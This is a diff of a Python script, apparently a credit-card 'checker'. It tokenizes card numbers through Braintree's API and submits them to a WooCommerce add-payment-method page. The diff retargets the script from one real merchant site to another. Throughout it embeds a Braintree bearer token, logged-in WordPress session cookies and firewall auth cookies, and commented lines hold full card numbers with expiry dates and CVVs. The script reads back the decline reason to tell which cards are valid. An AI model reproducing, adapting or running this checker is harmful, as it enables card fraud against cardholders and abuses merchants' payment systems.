@@ -19,7 +19,6 @@ def chk(card):
 	
 	
 	r = requests.session()
-	user = user_agent.generate_user_agent()
 	
 
 
@@ -28,6 +27,8 @@ def chk(card):
 
 
 
+
+	
 
 
 
@@ -43,8 +44,8 @@ def chk(card):
 	headers = {
     'authority': 'payments.braintree-api.com',
     'accept': '*/*',
-    'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
-    'authorization': 'Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJFUzI1NiIsImtpZCI6IjIwMTgwNDI2MTYtcHJvZHVjdGlvbiIsImlzcyI6Imh0dHBzOi8vYXBpLmJyYWludHJlZWdhdGV3YXkuY29tIn0.eyJleHAiOjE3MjQwODQwNDgsImp0aSI6IjBlM2Q4ZGYwLTAxNWQtNDQ2ZS05NjI3LTUyM2M1ODQ4NGMxYSIsInN1YiI6IjR3ZHhuYm4zcm5ueWs2dHEiLCJpc3MiOiJodHRwczovL2FwaS5icmFpbnRyZWVnYXRld2F5LmNvbSIsIm1lcmNoYW50Ijp7InB1YmxpY19pZCI6IjR3ZHhuYm4zcm5ueWs2dHEiLCJ2ZXJpZnlfY2FyZF9ieV9kZWZhdWx0IjpmYWxzZX0sInJpZ2h0cyI6WyJtYW5hZ2VfdmF1bHQiXSwic2NvcGUiOlsiQnJhaW50cmVlOlZhdWx0Il0sIm9wdGlvbnMiOnt9fQ.FNcE7qzbW9LdVGneLawufPZnCSHRc_NLD2FGNykWWVhYN9QqKCLrzmPPiwvtnhbCG3ZoQoa8wy7Dk1JDphqQeg',
+    'accept-language': 'ar-EG,ar;q=0.9',
+    'authorization': 'Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJFUzI1NiIsImtpZCI6IjIwMTgwNDI2MTYtcHJvZHVjdGlvbiIsImlzcyI6Imh0dHBzOi8vYXBpLmJyYWludHJlZWdhdGV3YXkuY29tIn0.eyJleHAiOjE3MjQxNjI0MTgsImp0aSI6IjkyZmY0NzA0LTY5ODItNDQ4Yi1iMWM2LWYwY2Q0ZTE4Y2U5ZSIsInN1YiI6Imt0ZHQzdmI3ZnIzYms5d3oiLCJpc3MiOiJodHRwczovL2FwaS5icmFpbnRyZWVnYXRld2F5LmNvbSIsIm1lcmNoYW50Ijp7InB1YmxpY19pZCI6Imt0ZHQzdmI3ZnIzYms5d3oiLCJ2ZXJpZnlfY2FyZF9ieV9kZWZhdWx0IjpmYWxzZX0sInJpZ2h0cyI6WyJtYW5hZ2VfdmF1bHQiXSwic2NvcGUiOlsiQnJhaW50cmVlOlZhdWx0Il0sIm9wdGlvbnMiOnt9fQ.7ZBE2dXOQwuVtJK7lulzUFIsW7AFfsnzL4vlGVtVC98JNRdk75sTRiexPxSsar-N5f70bR6-en6qCbByQ9rQ9Q',
     'braintree-version': '2018-05-10',
     'cache-control': 'no-cache',
     'content-type': 'application/json',
@@ -64,7 +65,7 @@ def chk(card):
     'clientSdkMetadata': {
         'source': 'client',
         'integration': 'custom',
-        'sessionId': '80680711-2505-4d23-adee-4be709a9d6cd',
+        'sessionId': '62a22a7b-50b4-49c6-b3c2-9ef2f9a6923a',
     },
     'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }',
     'variables': {
@@ -87,75 +88,51 @@ def chk(card):
 
 # Note: json_data will not be serialized by requests
 # exactly as it was in the original request.
-#data = '{"clientSdkMetadata":{"source":"client","integration":"custom","sessionId":"80680711-2505-4d23-adee-4be709a9d6cd"},"query":"mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }","variables":{"input":{"creditCard":{"number":"5122300448667440","expirationMonth":"10","expirationYear":"2025","cvv":"122"},"options":{"validate":false}}},"operationName":"TokenizeCreditCard"}'
+#data = '{"clientSdkMetadata":{"source":"client","integration":"custom","sessionId":"62a22a7b-50b4-49c6-b3c2-9ef2f9a6923a"},"query":"mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }","variables":{"input":{"creditCard":{"number":"4610460310238167","expirationMonth":"12","expirationYear":"2028","cvv":"333"},"options":{"validate":false}}},"operationName":"TokenizeCreditCard"}'
 #response = requests.post('https://payments.braintree-api.com/graphql', headers=headers, data=data)
-
-
 	tok = response.json()['data']['tokenizeCreditCard']['token']
 
 
 
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
 	cookies = {
-    'sbjs_current': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29',
-    'cookielawinfo-checkbox-necessary': 'yes',
-    '_gcl_au': '1.1.850505553.1719526396',
-    '_ga': 'GA1.1.512287116.1719526397',
-    '_fbp': 'fb.1.1719526398376.956231926783586650',
-    'newpass_announce': 'true',
-    'cookielawinfo-checkbox-functional': 'yes',
-    'cookielawinfo-checkbox-performance': 'yes',
-    'cookielawinfo-checkbox-analytics': 'yes',
-    'cookielawinfo-checkbox-advertisement': 'yes',
-    'cookielawinfo-checkbox-others': 'yes',
-    'viewed_cookie_policy': 'yes',
-    'cli_user_preference': 'en-cli-yes-checkbox-necessary-yes-checkbox-functional-yes-checkbox-performance-yes-checkbox-analytics-yes-checkbox-advertisement-yes-checkbox-others-yes',
-    'CookieLawInfoConsent': 'eyJ2ZXIiOiIxIiwibmVjZXNzYXJ5IjoidHJ1ZSIsImZ1bmN0aW9uYWwiOiJ0cnVlIiwicGVyZm9ybWFuY2UiOiJ0cnVlIiwiYW5hbHl0aWNzIjoidHJ1ZSIsImFkdmVydGlzZW1lbnQiOiJ0cnVlIiwib3RoZXJzIjoidHJ1ZSJ9',
-    'br_lgv_stat': 'default%7Cdefault',
+    'soundestID': '20240819135850-MaA8bLQS0sTtJ5NePffhDGkDS5QZssAWWM14wGfObO0UAYudL',
+    'omnisendSessionID': '4ynlE5MGcYirEs-20240819135850',
     'sbjs_migrations': '1418474375998%3D1',
-    'sbjs_first': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29',
-    'sbjs_udata': 'vst%3D14%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F124.0.0.0%20Mobile%20Safari%2F537.36',
-    'wordpress_sec_22d584ae58f64e78cb2ffa7e67fadab7': 'moh5bjjhb52vbnm%7C1725206782%7C1uCr5l7uQrakmsYB179hS1tR6fEPEB024ZsLqiLGR3n%7Cd056f4917a580a1a6dc5bd557e86d5429ea659d0ccfe35533a1fadea3da42385',
-    'wordpress_logged_in_22d584ae58f64e78cb2ffa7e67fadab7': 'moh5bjjhb52vbnm%7C1725206782%7C1uCr5l7uQrakmsYB179hS1tR6fEPEB024ZsLqiLGR3n%7C4e3ee8745a5ea70be1875029ccff494025caeb377c5b16ddaa0ceca356c8a95c',
-    'sbjs_session': 'pgs%3D14%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fce4less.com%2Fmy-account%2Fadd-payment-method%2F',
-    '_ga_JVCGZDD7ML': 'GS1.1.1723997161.13.1.1723997646.41.1.1418430270',
-    '_uetsid': 'c3924e005d7b11ef9eae1f85b3c81191',
-    '_uetvid': '73fa4a3034d211ef9413696097f18d56',
+    'sbjs_current_add': 'fd%3D2024-08-19%2013%3A58%3A50%7C%7C%7Cep%3Dhttps%3A%2F%2Fefxsports.com%2Fmy-account%2F%7C%7C%7Crf%3D%28none%29',
+    'sbjs_first_add': 'fd%3D2024-08-19%2013%3A58%3A50%7C%7C%7Cep%3Dhttps%3A%2F%2Fefxsports.com%2Fmy-account%2F%7C%7C%7Crf%3D%28none%29',
+    'sbjs_current': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
+    'sbjs_first': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
+    'sbjs_udata': 'vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F124.0.0.0%20Mobile%20Safari%2F537.36',
+    'wffn_flt': '2024-8-19 07:58:51',
+    'wffn_timezone': 'Africa/Cairo',
+    'wffn_is_mobile': 'true',
+    'wffn_browser': 'Chrome',
+    'wffn_referrer': '',
+    'wffn_fl_url': '/my-account/',
+    '_ga': 'GA1.1.638159887.1724075933',
+    '_gcl_au': '1.1.473779848.1724075933',
+    '_fbp': 'fb.1.1724075935096.599766361704921699',
+    'fkcart_cart_qty': '0',
+    'fkcart_cart_total': '%3Cspan%20class%3D%22woocommerce-Price-amount%20amount%22%3E%3Cbdi%3E%3Cspan%20class%3D%22woocommerce-Price-currencySymbol%22%3E%26%2336%3B%3C%2Fspan%3E0.00%3C%2Fbdi%3E%3C%2Fspan%3E',
+    'omnisend-form-65a6b96077ab435bd118c772-closed-at': '2024-08-19T13:59:00.078Z',
+    'omnisendContactID': '66c34fbb87cfc003a2d92e43',
+    'wordpress_logged_in_13e414371e5f1c2d9a0d5bf21c737d33': 'hfd0446ggdg42%7C1725285567%7Cq1lDrSF6FfOqzFP0e6siTzASzUNH7SwV5zHaWB2imPL%7Cf4653fd8b866641ac5b731ae6a4e0c5afb17ab6dc64bb61d6508a44783da7d35',
+    'wfwaf-authcookie-e3884509b68293414f1439a8c4f61fd5': '44954%7Cother%7Cread%7Cd3a062394e084ea7c81b78582a2356d9375958848a06249dc174db38871d621d',
+    'sbjs_session': 'pgs%3D7%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fefxsports.com%2Fmy-account%2Fadd-payment-method%2F',
+    'page-views': '8',
+    '_ga_CYYECGMPHQ': 'GS1.1.1724075932.1.1.1724076044.9.0.0',
 }
 
 	headers = {
-    'authority': 'ce4less.com',
+    'authority': 'efxsports.com',
     'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
-    'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
+    'accept-language': 'ar-EG,ar;q=0.9',
     'cache-control': 'no-cache',
     'content-type': 'application/x-www-form-urlencoded',
-    # 'cookie': 'sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29; cookielawinfo-checkbox-necessary=yes; _gcl_au=1.1.850505553.1719526396; _ga=GA1.1.512287116.1719526397; _fbp=fb.1.1719526398376.956231926783586650; newpass_announce=true; cookielawinfo-checkbox-functional=yes; cookielawinfo-checkbox-performance=yes; cookielawinfo-checkbox-analytics=yes; cookielawinfo-checkbox-advertisement=yes; cookielawinfo-checkbox-others=yes; viewed_cookie_policy=yes; cli_user_preference=en-cli-yes-checkbox-necessary-yes-checkbox-functional-yes-checkbox-performance-yes-checkbox-analytics-yes-checkbox-advertisement-yes-checkbox-others-yes; CookieLawInfoConsent=eyJ2ZXIiOiIxIiwibmVjZXNzYXJ5IjoidHJ1ZSIsImZ1bmN0aW9uYWwiOiJ0cnVlIiwicGVyZm9ybWFuY2UiOiJ0cnVlIiwiYW5hbHl0aWNzIjoidHJ1ZSIsImFkdmVydGlzZW1lbnQiOiJ0cnVlIiwib3RoZXJzIjoidHJ1ZSJ9; br_lgv_stat=default%7Cdefault; sbjs_migrations=1418474375998%3D1; sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29; sbjs_udata=vst%3D14%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F124.0.0.0%20Mobile%20Safari%2F537.36; wordpress_sec_22d584ae58f64e78cb2ffa7e67fadab7=moh5bjjhb52vbnm%7C1725206782%7C1uCr5l7uQrakmsYB179hS1tR6fEPEB024ZsLqiLGR3n%7Cd056f4917a580a1a6dc5bd557e86d5429ea659d0ccfe35533a1fadea3da42385; wordpress_logged_in_22d584ae58f64e78cb2ffa7e67fadab7=moh5bjjhb52vbnm%7C1725206782%7C1uCr5l7uQrakmsYB179hS1tR6fEPEB024ZsLqiLGR3n%7C4e3ee8745a5ea70be1875029ccff494025caeb377c5b16ddaa0ceca356c8a95c; sbjs_session=pgs%3D14%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fce4less.com%2Fmy-account%2Fadd-payment-method%2F; _ga_JVCGZDD7ML=GS1.1.1723997161.13.1.1723997646.41.1.1418430270; _uetsid=c3924e005d7b11ef9eae1f85b3c81191; _uetvid=73fa4a3034d211ef9413696097f18d56',
-    'origin': 'https://ce4less.com',
+    # 'cookie': 'soundestID=20240819135850-MaA8bLQS0sTtJ5NePffhDGkDS5QZssAWWM14wGfObO0UAYudL; omnisendSessionID=4ynlE5MGcYirEs-20240819135850; sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2024-08-19%2013%3A58%3A50%7C%7C%7Cep%3Dhttps%3A%2F%2Fefxsports.com%2Fmy-account%2F%7C%7C%7Crf%3D%28none%29; sbjs_first_add=fd%3D2024-08-19%2013%3A58%3A50%7C%7C%7Cep%3Dhttps%3A%2F%2Fefxsports.com%2Fmy-account%2F%7C%7C%7Crf%3D%28none%29; sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F124.0.0.0%20Mobile%20Safari%2F537.36; wffn_flt=2024-8-19 07:58:51; wffn_timezone=Africa/Cairo; wffn_is_mobile=true; wffn_browser=Chrome; wffn_referrer=; wffn_fl_url=/my-account/; _ga=GA1.1.638159887.1724075933; _gcl_au=1.1.473779848.1724075933; _fbp=fb.1.1724075935096.599766361704921699; fkcart_cart_qty=0; fkcart_cart_total=%3Cspan%20class%3D%22woocommerce-Price-amount%20amount%22%3E%3Cbdi%3E%3Cspan%20class%3D%22woocommerce-Price-currencySymbol%22%3E%26%2336%3B%3C%2Fspan%3E0.00%3C%2Fbdi%3E%3C%2Fspan%3E; omnisend-form-65a6b96077ab435bd118c772-closed-at=2024-08-19T13:59:00.078Z; omnisendContactID=66c34fbb87cfc003a2d92e43; wordpress_logged_in_13e414371e5f1c2d9a0d5bf21c737d33=hfd0446ggdg42%7C1725285567%7Cq1lDrSF6FfOqzFP0e6siTzASzUNH7SwV5zHaWB2imPL%7Cf4653fd8b866641ac5b731ae6a4e0c5afb17ab6dc64bb61d6508a44783da7d35; wfwaf-authcookie-e3884509b68293414f1439a8c4f61fd5=44954%7Cother%7Cread%7Cd3a062394e084ea7c81b78582a2356d9375958848a06249dc174db38871d621d; sbjs_session=pgs%3D7%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fefxsports.com%2Fmy-account%2Fadd-payment-method%2F; page-views=8; _ga_CYYECGMPHQ=GS1.1.1724075932.1.1.1724076044.9.0.0',
+    'origin': 'https://efxsports.com',
     'pragma': 'no-cache',
-    'referer': 'https://ce4less.com/my-account/add-payment-method/',
+    'referer': 'https://efxsports.com/my-account/add-payment-method/',
     'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
     'sec-ch-ua-mobile': '?1',
     'sec-ch-ua-platform': '"Android"',
@@ -167,24 +144,30 @@ def chk(card):
     'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
 }
 
-	data = {
-    'payment_method': 'braintree_credit_card',
-    'wc-braintree-credit-card-card-type': 'master-card',
-    'wc-braintree-credit-card-3d-secure-enabled': '',
-    'wc-braintree-credit-card-3d-secure-verified': '',
-    'wc-braintree-credit-card-3d-secure-order-total': '0.00',
-    'wc_braintree_credit_card_payment_nonce': tok,
-    'wc_braintree_device_data': '',
-    'wc-braintree-credit-card-tokenize-payment-method': 'true',
-    'woocommerce-add-payment-method-nonce': '3c2d1ac5ab',
-    '_wp_http_referer': '/my-account/add-payment-method/',
-    'woocommerce_add_payment_method': '1',
-}
+	data = [
+    ('payment_method', 'braintree_credit_card'),
+    ('wc-braintree-credit-card-card-type', 'visa'),
+    ('wc-braintree-credit-card-3d-secure-enabled', ''),
+    ('wc-braintree-credit-card-3d-secure-verified', ''),
+    ('wc-braintree-credit-card-3d-secure-order-total', '0.00'),
+    ('wc_braintree_credit_card_payment_nonce',tok,),
+    ('wc_braintree_device_data', '{"correlation_id":"0379daf599ca140906e7ed800aaac1a5"}'),
+    ('wc-braintree-credit-card-tokenize-payment-method', 'true'),
+    ('wc_braintree_paypal_payment_nonce', ''),
+    ('wc_braintree_device_data', '{"correlation_id":"0379daf599ca140906e7ed800aaac1a5"}'),
+    ('wc-braintree-paypal-context', 'shortcode'),
+    ('wc_braintree_paypal_amount', '0.00'),
+    ('wc_braintree_paypal_currency', 'USD'),
+    ('wc_braintree_paypal_locale', 'en_us'),
+    ('wc-braintree-paypal-tokenize-payment-method', 'true'),
+    ('woocommerce-add-payment-method-nonce', 'f63edf771d'),
+    ('_wp_http_referer', '/my-account/add-payment-method/'),
+    ('woocommerce_add_payment_method', '1'),
+]
 
-	response = requests.post('https://ce4less.com/my-account/add-payment-method/', cookies=cookies, headers=headers, data=data)
-	pattern = r'Reason: (.*?)\s*</li>'
-    
+	response = requests.post('https://efxsports.com/my-account/add-payment-method/', cookies=cookies, headers=headers, data=data)
 	text = response.text
+	pattern = r'Status code (.*?)\s*</div>'
 	
 	match = re.search(pattern, text)
 	if match:
@@ -198,3 +181,6 @@ def chk(card):
 			result = "Error"
 			
 	return result
+
+
+	
